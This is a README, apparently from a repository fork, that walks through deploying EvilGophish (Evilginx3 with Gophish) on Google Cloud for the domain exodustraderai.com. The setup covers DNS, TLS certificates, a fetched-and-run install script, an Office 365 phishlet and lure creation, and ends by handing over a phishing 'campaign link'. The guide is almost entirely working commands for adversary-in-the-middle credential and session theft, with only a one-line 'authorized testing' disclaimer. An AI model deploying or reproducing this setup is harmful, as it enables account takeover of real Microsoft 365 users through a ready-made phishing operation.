# EvilGophish Automated Deployment

**Simple 3-step automated deployment for Google Cloud Shell**

Domain: **exodustraderai.com**
No Cloudflare required - uses Google Cloud DNS

---

## Quick Start (3 Steps)

### Step 1: Run GCP Setup Script (Cloud Shell)

Open Google Cloud Shell: https://console.cloud.google.com (click terminal icon)

```bash
# Download the scripts
git clone https://github.com/theroseinc/evilgophish.git
cd evilgophish/scripts/automated-deployment

# Make scripts executable
chmod +x *.sh

# Run GCP setup
./01-gcp-setup.sh
```

**What this does automatically:**
- Creates new GCP project (or uses existing)
- Enables required APIs
- Sets up Google Cloud DNS
- Reserves external IP address
- Creates DNS A records for 6 subdomains
- Creates firewall rules
- Deploys Ubuntu VM

**You'll be asked for:**
1. Billing account ID (shown in the script)
2. Confirmation after updating domain nameservers

**Manual action required:**
- Update nameservers at your domain registrar (script shows you which ones)

---

### Step 2: Update Domain Nameservers

The script will show you Google Cloud DNS nameservers like:
```
ns-cloud-a1.googledomains.com
ns-cloud-a2.googledomains.com
ns-cloud-a3.googledomains.com
ns-cloud-a4.googledomains.com
```

**Go to your domain registrar** (where you bought exodustraderai.com):
1. Log in to your domain registrar account
2. Find "Nameservers" or "DNS Settings"
3. Change from default to **Custom Nameservers**
4. Enter the 4 Google Cloud nameservers from the script
5. Save changes
6. Press ENTER in the script to continue

**Wait 5-10 minutes for DNS propagation**

---

### Step 3: Run VM Installation Script (On the VM)

After Step 1 completes, SSH into your VM:

```bash
# The script shows you this command:
gcloud compute ssh evilgophish-server --zone=us-central1-c
```

Inside the VM, download and run the installation script:

```bash
# Download the installation script
wget https://raw.githubusercontent.com/theroseinc/evilgophish/main/scripts/automated-deployment/02-vm-install.sh

# Make it executable
chmod +x 02-vm-install.sh

# Run it
./02-vm-install.sh
```

**What this does automatically:**
- Updates system packages
- Installs Go 1.21
- Installs Evilginx3 and builds it
- Installs Gophish
- Installs Frameless-BitB (if available)
- Disables systemd-resolved (port 53 conflict)
- Disables Apache (port 443 conflict)
- Installs Certbot
- Generates SSL certificates for all 6 subdomains
- Creates O365 phishlet
- Configures Gophish
- Creates systemd service for Gophish
- Creates helper scripts

**You'll be asked for:**
1. Your email address (for Let's Encrypt SSL certificates)

---

## After Installation

### Access Gophish Admin Panel

```bash
# Get Gophish password
journalctl -u gophish | grep password
```

Open: `https://<YOUR_EXTERNAL_IP>:3333`
- Username: `admin`
- Password: (from command above)

### Start Evilginx3

```bash
# Start Evilginx3 interactively
/opt/security-testing/evilgophish/start-evilginx.sh
```

Inside Evilginx3, run these commands:

```
config domain exodustraderai.com
config ipv4 external <YOUR_EXTERNAL_IP>
phishlets hostname o365 login.exodustraderai.com
crt /etc/letsencrypt/live/login.exodustraderai.com/fullchain.pem /etc/letsencrypt/live/login.exodustraderai.com/privkey.pem
phishlets enable o365
lures create o365
lures get-url 0
```

**Copy the phishing URL** - this is your campaign link!

### Test Phishing Page

Open the lure URL in a browser - you should see the Microsoft Office 365 login page.

---

## What Gets Created

### GCP Resources
- **Project**: `evilgophish-prod-<timestamp>`
- **External IP**: Static IP address
- **DNS Zone**: `exodustraderai-zone`
- **DNS Records**: 6 A records for subdomains
- **Firewall**: Allows ports 22, 53, 80, 443, 3333
- **VM**: `evilgophish-server` (e2-standard-2, Ubuntu 22.04)

### Subdomains Created
All pointing to your external IP:
- `login.exodustraderai.com`
- `www.exodustraderai.com`
- `portal.exodustraderai.com`
- `admin.exodustraderai.com`
- `feed.exodustraderai.com`
- `api.exodustraderai.com`

### Installed Software
- **Go 1.21** - Required for building
- **Evilginx3** - MITM phishing proxy
- **Gophish** - Phishing campaign management
- **Certbot** - SSL certificate generation
- **Frameless-BitB** - Browser-in-the-browser templates (optional)

### Services Running
- **Gophish**: Port 3333 (HTTPS) - Auto-starts on boot
- **Evilginx3**: Ports 53, 80, 443 - Manual start

---

## Troubleshooting

### DNS Not Resolving

Wait 10-15 minutes after updating nameservers, then test:

```bash
dig login.exodustraderai.com +short
# Should return your external IP
```

### SSL Certificate Failed

DNS must be fully propagated. Wait and retry:

```bash
certbot certonly --standalone --preferred-challenges http \
    -d login.exodustraderai.com \
    -d www.exodustraderai.com \
    -d portal.exodustraderai.com \
    -d admin.exodustraderai.com \
    -d feed.exodustraderai.com \
    -d api.exodustraderai.com \
    --non-interactive --agree-tos \
    -m your-email@example.com
```

### Evilginx3 Won't Start

Check if anything is using ports:

```bash
netstat -tlnp | grep -E ':(53|80|443)'
```

Kill conflicting processes:

```bash
fuser -k 53/tcp
fuser -k 80/tcp
fuser -k 443/tcp
```

### Gophish Not Running

Check service status:

```bash
systemctl status gophish
journalctl -u gophish -f
```

Restart service:

```bash
systemctl restart gophish
```

---

## Security Notes

- This setup is for **authorized security testing only**
- All services run as root (production should use dedicated users)
- Firewall allows all IPs (production should whitelist specific IPs)
- SSL certificates auto-renew via certbot
- Keep your Gophish admin password secure

---

## Cost Estimate

**GCP Resources Monthly Cost:**
- VM (e2-standard-2): ~$50/month
- Static IP: ~$7/month
- DNS Zone: $0.20 + $0.40 per million queries
- Total: ~$60/month

**To delete everything:**

```bash
# Delete VM
gcloud compute instances delete evilgophish-server --zone=us-central1-c

# Delete external IP
gcloud compute addresses delete evilgophish-ip --region=us-central1

# Delete firewall rule
gcloud compute firewall-rules delete evilgophish-allow-all

# Delete DNS zone (delete all records first)
gcloud dns managed-zones delete exodustraderai-zone

# Delete project
gcloud projects delete <PROJECT_ID>
```

---

## Support

For issues, check:
- GCP Console: https://console.cloud.google.com
- Evilginx3 Docs: https://github.com/kgretzky/evilginx2
- Gophish Docs: https://docs.getgophish.com

---

**That's it! Automated deployment in 3 simple steps.**
